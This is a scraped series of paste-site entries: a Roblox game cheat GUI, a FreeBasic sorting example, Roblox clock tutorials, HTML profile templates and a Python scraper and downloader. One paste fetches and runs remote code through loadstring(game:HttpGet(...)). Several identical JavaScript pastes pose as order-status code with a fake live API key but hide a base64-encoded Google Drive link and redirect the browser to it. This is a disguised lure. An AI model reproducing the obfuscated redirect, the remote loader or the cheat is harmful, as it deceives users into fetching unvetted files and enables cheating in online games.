	mainFrame.Style = Enum.FrameStyle.DropShadow
	mainFrame.Size = UDim2.new(0.25, 0, 0.2, 0)
	mainFrame.Position = UDim2.new(0,0, 0.789, 0)
	mainFrame.ZIndex = math.huge

	local autoMoneyTextButton = Instance.new(""TextButton"", mainFrame)
	autoMoneyTextButton.Text = ""AutoMoney""
	autoMoneyTextButton.TextScaled = true
	autoMoneyTextButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
	autoMoneyTextButton.Size = UDim2.new(0.3, 0, 0.45, 0)
	autoMoneyTextButton.Position = UDim2.new(0.056, 0, 0.051, 0)

	local autoSellTextButton = autoMoneyTextButton:Clone()
	autoSellTextButton.Parent = mainFrame
	autoSellTextButton.Text = ""AutoSell""
	autoSellTextButton.Position = UDim2.new(0.413, 0, 0.051, 0)

	local autoBlowTextButton = autoMoneyTextButton:Clone()
	autoBlowTextButton.Parent = mainFrame
	autoBlowTextButton.Text = ""AutoBlow""
	autoBlowTextButton.Position = UDim2.new(0.055, 0, 0.542, 0)

	local respawnTextButton = autoMoneyTextButton:Clone()
	respawnTextButton.Parent = mainFrame
	respawnTextButton.Text = ""Respawn""
	respawnTextButton.Position = UDim2.new(0.75, 0, 0.145, 0)
	respawnTextButton.Size = UDim2.new(0.213, 0,0.329, 0)
	respawnTextButton.TextColor3 = Color3.fromRGB(255,255,255)
	respawnTextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

	local textBox = Instance.new(""TextBox"", mainFrame)
	textBox.Text = 1.25
	textBox.TextScaled = true
	textBox.Size = UDim2.new(0.227, 0, 0.301, 0)
	textBox.Position = UDim2.new(0.75, 0, 0.601, 0)
	textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)

	local trampolineLabel = Instance.new(""TextLabel"", mainFrame)
	trampolineLabel.Text = ""Main Trampoline Power""
	trampolineLabel.TextScaled = true
	trampolineLabel.BackgroundColor3 = Color3.fromRGB(0, 168, 255)
	trampolineLabel.Size = UDim2.new(0.3, 0,0.45, 0)
	trampolineLabel.Position = UDim2.new(0.413, 0,0.532, 0)

	--[[For The Skidders Have A Heart And Leave My Name Please!!!]]
	local creatorLabel = Instance.new(""TextLabel"", mainGui)
	creatorLabel.Text = ""Bubble Gum Sim Inf By Lucent""
	creatorLabel.TextScaled = true
	creatorLabel.BackgroundTransparency = 1
	creatorLabel.Size = UDim2.new(0.25, 0, 0.035, 0)
	creatorLabel.Position = UDim2.new(0, 0, 0.753, 0)
	creatorLabel.TextColor3 = Color3.fromRGB(255, 203, 145)
	creatorLabel.ZIndex = math.huge

	--[[CODE]]
	plr = game.Players.LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	local Hum = char:WaitForChild(""Humanoid"")

	local RS = game:GetService(""ReplicatedStorage"")
	local Network = RS.Shared.Framework.Network
	local Remote = Network.Remote
	local Event = Remote.Event

	Hum.Died:Once(function()
		_G.autoMoney = false;
		_G.autoSell = false;
		_G.autoBlow = false;
		print(""Reseted Global Variables: "", _G.autoMoney,_G.autoSell,_G.autoBlow);
	end)

	autoMoneyTextButton.MouseButton1Click:Connect(function()
		if _G.autoMoney == false or _G.autoMoney == nil then
			autoMoneyTextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			_G.autoMoney = true
		else
			autoMoneyTextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			_G.autoMoney = false
		end

		repeat task.wait()
			if _G.autoMoney == true then
				Event:FireServer(""BlowBubble"");
				Event:FireServer(""SellBubble"");
			end
		until _G.autoMoney == false
	end)

	autoBlowTextButton.MouseButton1Click:Connect(function()
		if _G.autoBlow == false or _G.autoBlow == nil then
			autoBlowTextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			_G.autoBlow = true
		else
			autoBlowTextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			_G.autoBlow = false
		end

		repeat task.wait()
			if _G.autoBlow == true then
				Event:FireServer(""BlowBubble"");
			end
		until _G.autoBlow == false
	end)

	autoSellTextButton.MouseButton1Click:Connect(function()
		if _G.autoSell == false or _G.autoSell == nil then
			autoSellTextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			_G.autoSell = true
		else
			autoSellTextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			_G.autoSell = false
		end

		repeat task.wait()
			if _G.autoSell == true then
				Event:FireServer(""SellBubble"");
			end
		until _G.autoSell == false
	end)

	textBox.Changed:Connect(function(property)
		if (property == ""Text"") then
			local text = textBox.Text

			if tonumber(text) ~= nil then -- If yes then assign the value to the Trampoline
				textBox.BackgroundColor3 = Color3.fromRGB(0,255,0)
				textBox.TextColor3 = Color3.fromRGB(255,255,255)
                
                
                for i,v in workspace:GetDescendants() do
                   if v.Name == ""Trampoline"" then
                       for j, k in v:GetAttributes() do
                            if j == ""Power"" then
        					    v:SetAttribute(j, tonumber(text))
        			       end
                       end
                    end
                end
                
			else
				textBox.BackgroundColor3 = Color3.fromRGB(255,0,0)
				textBox.TextColor3 = Color3.fromRGB(255,255,255)
			end
		end
	end)

	respawnTextButton.MouseButton1Click:Connect(function()
		if Hum and Hum.Health ~= 0 then
			Hum:TakeDamage(math.huge)
		end
	end)
end


if _G.BGSM == nil then
	_G.BGSM = true;
	plr.CharacterAdded:Connect(function()
		createCheat()
	end)
else
	print(""Already Created Bro!"")
end
--This Is For Users Who Don't Aute Execute
local succ, err = pcall(function()
	local check = plr.PlayerGui.LUCENTHACK
end)

if err then
	createCheat()
end"
sRNebvMR,crt qsort example,Dr_Davenstein,FreeBasic,Wednesday 16th of April 2025 10:10:59 PM CDT,"#include once ""crt.bi""

randomize timer

type character_struct
	
	as string * 10 name
	
	as integer yPosition
	
end type



declare function char_sort_callback cdecl ( byval elm1 as any ptr, byval elm2 as any ptr ) as integer



dim as character_struct characters(10)

print ""NOT SORTED...""
for i as integer = 0 to ubound(characters)
	
	characters(i).yPosition = int(rnd*10000) 
	print characters(i).yPosition
	
next



'here's how to call the crt qsort on a custom type
qsort( @characters(0), ubound(characters)+1, sizeof(character_struct), @char_sort_callback() )

print
print ""SORTED...""
for i as integer = 0 to ubound(characters)
	
	print characters(i).yPosition
	
next

sleep



'here's the meat of it...
'we're sorting based on the ""yPosition"" variable in the character type,
'which will sort every element of the whole array in turn.
function char_sort_callback cdecl ( byval elm1 as any ptr, byval elm2 as any ptr ) as integer
		
	return sgn( (cptr(character_struct ptr, elm1)->yPosition) - (cptr(character_struct ptr, elm2)->yPosition) )
		
end function"
z2CGzwak,Maxhub,GUI_Maker_Roblox,Lua,Wednesday 16th of April 2025 10:09:52 PM CDT,"--[[
	discord.gg/maxhub
	This is the Purchase guide script
--]]
loadstring(game:HttpGet(""https://api.luarmor.net/files/v3/loaders/3f4c258405c294983a9b0e113dad3de7.lua""))()"
zd78iAeF,Order.js,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 10:08:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60620/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LguJRadX,revamped baked goods,elltaker,HTML,Wednesday 16th of April 2025 09:55:06 PM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/tumblr_lkl7439kSD1qfamg6.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/tumblr_lkl7439kSD1qfamg6.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/tumblr_ltj3q2zIjp1r17znu.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/tumblr_ltj3q2zIjp1r17znu.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/tumblr_ltj3q2zIjp1r17znu.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/tumblr_lmixs5RYVu1qkvalqo1_250.gif"" style=""height:30px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/Kaffee_Kuchen_41.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
ZLkNA2dL,Market.js,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 09:53:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64504/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LFzBMLCU,revamped sweet treats,elltaker,HTML,Wednesday 16th of April 2025 09:46:35 PM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mg12udF3Ym1qdlkyg.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/tumblr_inline_mg12udF3Ym1qdlkyg.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7ox3SLmT1qz4rgp.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7ox3SLmT1qz4rgp.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7ox3SLmT1qz4rgp.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/tumblr_o1ngy2JrTW1uxd3t8o1_250.gif"" style=""height:30px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/gumball.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
5XkVQ7Hp,Untitled,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 09:38:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33876/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FhRn5cqz,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 09:21:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xkw4nVfy,12 Hour Clock Tutorial,Cakey3101,Lua,Wednesday 16th of April 2025 09:19:05 PM CDT,"local Lighting = game:GetService(""Lighting"")
local RunService = game:GetService(""RunService"")

local Label = script.Parent

RunService.PostSimulation:Connect(function()
	local RawTime = Lighting.ClockTime
	local Hours = math.floor(RawTime % 12)
	local Minutes = math.floor((RawTime % 1) * 60)
	local AM_PM = (RawTime >= 12 and RawTime < 24) and ""PM"" or ""AM""

	if Hours == 0 then Hours = 12 end

	Label.Text = string.format(""Time: %02d:%02d %s"", Hours, Minutes, AM_PM)
end)
"
v8TCfzst,24 Hour Clock Tutorial,Cakey3101,Lua,Wednesday 16th of April 2025 09:18:18 PM CDT,"local Lighting = game:GetService(""Lighting"")
local RunService = game:GetService(""RunService"")

local Label = script.Parent

RunService.PostSimulation:Connect(function()
	local CurrentTime = math.floor(Lighting.ClockTime)
	local Minutes = math.floor((Lighting.ClockTime % 1) * 60)
	Label.Text = string.format(""Time: %02d:%02d"", CurrentTime, Minutes)
end)"
Fp6f8Gv9,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 09:06:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36645/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u7WbnBfp,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 08:50:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47148/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
18fjKi7V,Untitled,jm33,JavaScript,Wednesday 16th of April 2025 08:35:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71657/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VQsrLEiC,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 08:20:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04053/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ddHLs2M9,SCRAPE-AND-DOWNLOAD.pyw,Najeebsk,Python,Wednesday 16th of April 2025 08:07:49 PM CDT,"import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import webbrowser
import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import yt_dlp
import subprocess
from PIL import Image, ImageTk
import io
import threading
import shutil
# ------------------------------
from tkinter import scrolledtext
stop_download_flag = False
#================ADD-IMAGE-ICON=================
import sys

def resource_path(relative_path):
    """""" Get the absolute path to the resource, works for PyInstaller. """"""
    if getattr(sys, '_MEIPASS', False):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("".""), relative_path)

# Use this function to load files:
#splash_image = resource_path(""splash-1.png"")
icon_path = resource_path(""D.ico"")
#================ADD-IMAGE-ICON=================

# Register browsers with full path
chrome_path = r""C:\Program Files\Google\Chrome\Application\chrome.exe""
firefox_path = r""C:\Program Files\Mozilla Firefox\firefox.exe""
if os.path.exists(chrome_path):
    webbrowser.register(""chrome"", None, webbrowser.BackgroundBrowser(chrome_path))
if os.path.exists(firefox_path):
    webbrowser.register(""firefox"", None, webbrowser.BackgroundBrowser(firefox_path))

# === Main Window ===
window = tk.Tk()
window.title(""NAJEEB SHAH KHAN SCRAPE WEB & Image Search Tool & Media Downloader"")
window.geometry(""965x700"")
#window.configure(bg=""#2c3e50"")
window.iconbitmap(icon_path)

notebook = ttk.Notebook(window)
tab1 = ttk.Frame(notebook)
tab2 = ttk.Frame(notebook)
notebook.add(tab1, text=""Image Search Tool"")
notebook.add(tab2, text=""Media Downloader"")
notebook.pack(expand=True, fill=""both"")

# ====================
# === Tab 1 Content ===
# ====================
dark_mode_var = tk.BooleanVar()
keyword_var = tk.StringVar()
site_var = tk.StringVar()
extra_format_var = tk.StringVar()
query_preview_var = tk.StringVar()
browser_var = tk.StringVar(value=""default"")
format_vars = {
    ""jpg"": tk.BooleanVar(value=True),
    ""png"": tk.BooleanVar(value=True),
    ""gif"": tk.BooleanVar(),
    ""bmp"": tk.BooleanVar(),
    ""webp"": tk.BooleanVar(),
}

def update_query_preview():
    selected_formats = [f for f, var in format_vars.items() if var.get()]
    custom_format = extra_format_var.get().strip()
    keyword = keyword_var.get().strip()
    site = site_var.get().strip()
    all_formats = selected_formats.copy()
    if custom_format:
        all_formats.append(custom_format)
    filetype_str = ' | '.join(all_formats) if all_formats else ""jpg | png""
    query = 'intitle:""index of""'
    if keyword:
        query += f' ({keyword})'
    query += f' ({filetype_str})'
    if site:
        query += f' site:{site}'
    query_preview_var.set(query)

def perform_search():
    query = query_preview_var.get()
    if not query:
        result_text.delete(""1.0"", tk.END)
        result_text.insert(tk.END, ""‚ö†Ô∏è Query is empty."")
        return
    url = f""https://www.google.com/search?q={query.replace(' ', '+')}""
    result_text.delete(""1.0"", tk.END)
    result_text.insert(tk.END, f""üîç Google Search URL:\n{url}"")
    browser = browser_var.get()
    try:
        if browser == ""chrome"":
            webbrowser.get(""chrome"").open(url)
        elif browser == ""firefox"":
            webbrowser.get(""firefox"").open(url)
        else:
            webbrowser.open(url)
    except webbrowser.Error:
        result_text.insert(tk.END, f""\n‚ö†Ô∏è Failed to open {browser}, using default browser instead."")
        webbrowser.open(url)

def toggle_dark_mode():
    dark = dark_mode_var.get()
    bg = ""#1e1e1e"" if dark else ""#ffffff""
    fg = ""#ffffff"" if dark else ""#000000""
    widgets = [tab1, format_frame, keyword_label, keyword_entry,
               site_label, site_entry, extra_label, extra_entry,
               preview_label, preview_entry, search_button, dark_mode_check,
               browser_label, result_label, result_text]
    for widget in widgets:
        try:
            widget.config(bg=bg, fg=fg)
        except:
            pass
    keyword_entry.config(insertbackground=fg)
    site_entry.config(insertbackground=fg)
    extra_entry.config(insertbackground=fg)
    result_text.config(insertbackground=fg)

# Tab 1 Layout
tk.Label(tab1, text=""Select Image Formats:"", bg=""#ffffff"").pack(anchor=""w"", padx=10, pady=5)
format_frame = tk.Frame(tab1, bg=""#ffffff"")
format_frame.pack(anchor=""w"", padx=20)
for fmt, var in format_vars.items():
    cb = tk.Checkbutton(format_frame, text=fmt, variable=var, bg=""#ffffff"", command=update_query_preview)
    cb.pack(side=""left"", padx=5)

extra_label = tk.Label(tab1, text=""Type any extra format or word (e.g. tif, raw):"", bg=""#ffffff"")
extra_label.pack(anchor=""w"", padx=10, pady=5)
extra_entry = tk.Entry(tab1, textvariable=extra_format_var, width=60, bg=""#ffffff"", fg=""#000000"")
extra_entry.pack(padx=10)
extra_entry.bind(""<KeyRelease>"", lambda e: update_query_preview())

keyword_label = tk.Label(tab1, text=""Enter Keywords (e.g. wallpaper | backgrounds):"", bg=""#ffffff"")
keyword_label.pack(anchor=""w"", padx=10, pady=5)
keyword_entry = tk.Entry(tab1, textvariable=keyword_var, width=60, bg=""#ffffff"", fg=""#000000"")
keyword_entry.pack(padx=10)
keyword_entry.bind(""<KeyRelease>"", lambda e: update_query_preview())

site_label = tk.Label(tab1, text=""Optional Site Filter (e.g. .edu, example.com):"", bg=""#ffffff"")
site_label.pack(anchor=""w"", padx=10, pady=5)
site_entry = tk.Entry(tab1, textvariable=site_var, width=60, bg=""#ffffff"", fg=""#000000"")
site_entry.pack(padx=10)
site_entry.bind(""<KeyRelease>"", lambda e: update_query_preview())

preview_label = tk.Label(tab1, text=""üîé Search Query Preview:"", bg=""#ffffff"", font=(""Arial"", 10, ""bold""))
preview_label.pack(anchor=""w"", padx=10, pady=5)
preview_entry = tk.Entry(tab1, textvariable=query_preview_var, width=80, state=""readonly"", bg=""#eeeeee"")
preview_entry.pack(padx=10, pady=5)

browser_label = tk.Label(tab1, text=""Select Browser:"", bg=""#ffffff"")
browser_label.pack(anchor=""w"", padx=10, pady=5)
browser_frame = tk.Frame(tab1, bg=""#ffffff"")
browser_frame.pack(anchor=""w"", padx=20)
tk.Radiobutton(browser_frame, text=""Default"", variable=browser_var, value=""default"", bg=""#ffffff"", command=update_query_preview).pack(side=""left"", padx=10)
tk.Radiobutton(browser_frame, text=""Chrome"", variable=browser_var, value=""chrome"", bg=""#ffffff"", command=update_query_preview).pack(side=""left"", padx=10)
tk.Radiobutton(browser_frame, text=""Firefox"", variable=browser_var, value=""firefox"", bg=""#ffffff"", command=update_query_preview).pack(side=""left"", padx=10)

search_button = tk.Button(tab1, text=""Search on Google"", command=perform_search)
search_button.pack(pady=10)

dark_mode_check = tk.Checkbutton(tab1, text=""Dark Mode"", variable=dark_mode_var, command=toggle_dark_mode, bg=""#ffffff"")
dark_mode_check.pack()

result_label = tk.Label(tab1, text=""Generated Google Search URL:"", bg=""#ffffff"")
result_label.pack(anchor=""w"", padx=10, pady=5)
result_text = tk.Text(tab1, height=4, width=80, wrap=""word"", bg=""#f8f8f8"")
result_text.pack(padx=10, pady=5)

update_query_preview()

# ====================
# === Tab 2 Content ===
# ====================
media_urls = []
special_sites = ['youtube.com', 'youtu.be', 'facebook.com', 'fb.watch', 'tiktok.com', 'instagram.com']
image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico']
video_exts = ['.mp4', '.webm', '.ogg', '.mov', '.avi', '.mkv', '.flv', '.3gp', '.wmv', '.m3u', '.m3u8']
stop_download_flag = False

def is_special_site(url):
    return any(domain in url for domain in special_sites)

def browse_url_file():
    file_path = filedialog.askopenfilename(title=""Open URL File"", filetypes=[(""Text files"", ""*.txt"")])
    if file_path:
        with open(file_path, 'r') as f:
            for line in f:
                url = line.strip()
                if url and url not in media_urls:
                    media_urls.append(url)
                    result_box.insert(tk.END, url + ""\n"")

def save_urls_to_file():
    file_path = filedialog.asksaveasfilename(defaultextension="".txt"", filetypes=[(""Text files"", ""*.txt"")])
    if file_path:
        with open(file_path, 'w') as f:
            f.write(result_box.get(""1.0"", tk.END).strip())
